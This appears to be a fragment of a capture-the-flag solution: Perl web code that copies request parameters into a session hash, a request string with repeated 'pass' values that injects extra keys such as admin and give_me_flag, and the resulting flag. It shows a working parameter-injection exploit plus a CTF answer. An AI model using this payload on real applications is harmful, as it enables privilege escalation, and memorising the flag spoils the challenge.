@@ -1,0 +1,9 @@
+        $self->session->{user} = {
+            name         => $self->param('name'),
+            pass         => $self->param('pass'),
+            give_me_flag => 0,
+            admin        => $is_admin,
+        };
+
+name=ShiftCrops&pass=abcd&pass=admin&pass=1&pass=give_me_flag
+ADCTF_L0v3ry_p3rl_c0N73x7
